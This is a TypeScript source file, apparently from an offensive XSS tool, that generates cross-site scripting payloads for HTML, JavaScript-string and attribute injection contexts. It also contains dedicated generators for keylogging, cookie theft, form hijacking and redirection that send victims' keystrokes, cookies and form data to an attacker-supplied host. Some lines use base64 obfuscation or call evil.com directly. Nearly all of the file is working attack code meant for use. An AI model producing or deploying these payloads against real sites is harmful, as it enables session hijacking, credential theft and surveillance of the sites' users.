import { GeneratorOptions, ContextType, PayloadType } from '../types';

const rc = <T,>(arr: T[]): T | undefined => {
    if (arr.length === 0) return undefined;
    return arr[Math.floor(Math.random() * arr.length)];
};

const jsFunctions = [
    'alert(1)',
    'prompt(document.domain)',
    'confirm`XSS`',
    'parent.postMessage(document.cookie,"*")',
    'navigator.sendBeacon("//evil.com",localStorage)',
    'eval(atob("ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20i"))',
];

export function generatePayloads(options: GeneratorOptions): string[] {
    switch (options.payloadType) {
        case PayloadType.General:
            return generateGeneralPayloads(options);
        case PayloadType.Keylogger:
            return generateKeyloggerPayloads(options.attackerHost);
        case PayloadType.CookieTheft:
            return generateCookieStealerPayloads(options.attackerHost);
        case PayloadType.FormHijacking:
            return generateFormHijackingPayloads(options.attackerHost);
        case PayloadType.Redirection:
            return generateRedirectionPayloads(options.attackerHost);
        default:
            return [];
    }
}

function generateGeneralPayloads(options: GeneratorOptions): string[] {
    const payloads = new Set<string>();
    const { contexts, allowedChars, tags: rawTags, attributes: rawAttributes } = options;

    const tags = rawTags.length > 0 ? rawTags : ['script', 'img', 'div', 'svg', 'a', 'iframe'];
    const attributes = rawAttributes.length > 0 ? rawAttributes : ['onload', 'onerror', 'onclick', 'onmouseover', 'src', 'href'];

    const add = (payload: string | undefined) => payload && payloads.add(payload);

    if (contexts.includes(ContextType.HTML)) {
        if (allowedChars.length >= 5) {
            for (let i = 0; i < 5; i++) {
                add(`'><${rc(tags)}>${rc(jsFunctions)}</${rc(tags)}>`);
                add(`'><${rc(tags)} ${rc(attributes)}='${rc(jsFunctions)}'></${rc(tags)}>`);
                add(`'><svg onload=${rc(jsFunctions)}>`);
                add(`'><script>window.name='${rc(jsFunctions)}'</script>`);
            }
        } else if (tags.length === 0 && allowedChars.includes('<') && allowedChars.includes('>')) {
            for (let i = 0; i < 5; i++) {
                add(`'><custom autofocus onfocus=${rc(jsFunctions)}>`);
                add(`'><x contenteditable onblur=${rc(jsFunctions)}>clickme</x>`);
            }
        } else {
            for (const func of jsFunctions) {
                add(`\${${func}}`);
                add(`javascript:${encodeURIComponent(func)}`);
            }
        }
    }

    if (contexts.includes(ContextType.JS_STRING)) {
        if (allowedChars.length >= 5 || (!allowedChars.includes("'") && tags.includes('script'))) {
             for (let i = 0; i < 5; i++) {
                add(`'><script>${rc(jsFunctions)}</script>`);
                add(`"</script><svg onload=${rc(jsFunctions)}>`);
            }
        } else if (!['<', '>', '\\', '"'].every(c => allowedChars.includes(c))) {
            for (let i = 0; i < 5; i++) {
                add(`';${rc(jsFunctions)};//`);
                const func = rc(jsFunctions)?.replace('(', '(1') || '';
                add(`-${func});//`);
            }
        } else {
            for (const func of jsFunctions) {
                add(`\${${func}}`);
                add(`\\u0061lert(1)`);
            }
        }
    }

    if (contexts.includes(ContextType.ATTRIBUTE)) {
        if (allowedChars.length >= 5) {
             for (let i = 0; i < 5; i++) {
                add(`'><${rc(tags)}>${rc(jsFunctions)}</${rc(tags)}>`);
                add(`'><${rc(tags)} ${rc(attributes)}='${rc(jsFunctions)}'></${rc(tags)}>`);
                add(`" autofocus onfocus=${rc(jsFunctions)} "`);
                add(`javascript:${encodeURIComponent(rc(jsFunctions) || '')}`);
            }
        } else if (!allowedChars.includes('<') && !allowedChars.includes('>')) {
            for (let i = 0; i < 5; i++) {
                add(`"${rc(attributes)}:${rc(jsFunctions)}"`);
                add(` ${rc(['onpointerenter','onwebkitanimationstart'])}'=${rc(jsFunctions)}`);
            }
        } else {
            for (const func of jsFunctions) {
                add(`\${${func}}`);
                add(`x="${func}"`);
            }
        }
    }

    return Array.from(payloads);
}

function generateKeyloggerPayloads(attackerHost: string): string[] {
    if (!attackerHost) return ["Error: Attacker Host is required."];
    const EXFIL_URL = `https://${attackerHost}/?k=`;
    
    const jsCode = `document.onkeypress=function(e){new Image().src='${EXFIL_URL}'+e.key}`;
    const encodedJs = btoa(jsCode);

    return [
        `<script>${jsCode}</script>`,
        `<img src=x onerror="${jsCode}">`,
        `<svg onload="${jsCode}"></svg>`,
        `javascript:${jsCode}`,
        `' onkeypress="fetch('${EXFIL_URL}'+event.key)" '`,
        `<script src="data:text/javascript;base64,${encodedJs}"></script>`
    ];
}


function generateCookieStealerPayloads(attackerHost: string): string[] {
    if (!attackerHost) return ["Error: Attacker Host is required."];
    const EXFIL_URL = `https://${attackerHost}/?cookie=`;

    const jsCode = `new Image().src='${EXFIL_URL}'+encodeURIComponent(document.cookie)`;
    const encodedJs = btoa(jsCode);

    return [
        `<img src=x onerror="${jsCode}">`,
        `<svg onload="${jsCode}"></svg>`,
        `javascript:${jsCode}`,
        `<script src="data:text/javascript;base64,${encodedJs}"></script>`,
        `<script>fetch("${EXFIL_URL}"+encodeURIComponent(document.cookie))</script>`,
        `" onload="${jsCode}" "`
    ];
}

function generateFormHijackingPayloads(attackerHost: string): string[] {
    if (!attackerHost) return ["Error: Attacker Host is required."];
    const EXFIL_URL = `https://${attackerHost}/?data=`;

    const jsCodeSimple = `document.querySelectorAll('form').forEach(f => f.addEventListener('submit', function(e) { e.preventDefault(); var fd = new FormData(this); var d = ''; for (var p of fd.entries()){d += p[0] + '=' + p[1] + '&';} new Image().src='${EXFIL_URL}' + btoa(d); }, true))`.replace(/\s+/g, ' ');
    const jsCodeFetch = `document.querySelectorAll('form').forEach(f => f.onsubmit = async (e) => { e.preventDefault(); await fetch('${EXFIL_URL}', { method: 'POST', body: new URLSearchParams(new FormData(e.target)) }); })`.replace(/\s+/g, ' ');

    return [
        `<img src=x onerror="document.forms[0].action='${EXFIL_URL}';">`,
        `<svg onload="document.forms[0].action='${EXFIL_URL}';"></svg>`,
        `<script>${jsCodeSimple}</script>`,
        `' onfocus="document.forms[0].action='${EXFIL_URL}';" autofocus '`,
        `<script>${jsCodeFetch}</script>`,
        `<script src="data:text/javascript;base64,${btoa(jsCodeSimple)}"></script>`
    ];
}

function generateRedirectionPayloads(attackerHost: string): string[] {
    if (!attackerHost) return ["Error: Attacker Host is required."];
    const REDIRECT_URL = `https://${attackerHost}`;

    const jsCode = `window.location.href='${REDIRECT_URL}'`;
    const encodedJs = btoa(jsCode);

    return [
        `<script>${jsCode}</script>`,
        `<img src=x onerror="${jsCode}">`,
        `<svg onload="${jsCode}"></svg>`,
        `<meta http-equiv="refresh" content="0;url=${REDIRECT_URL}">`,
        `javascript:window.location='${REDIRECT_URL}'`,
        `<script src="data:text/javascript;base64,${encodedJs}"></script>`,
        `" autofocus onfocus="${jsCode}" "`
    ];
}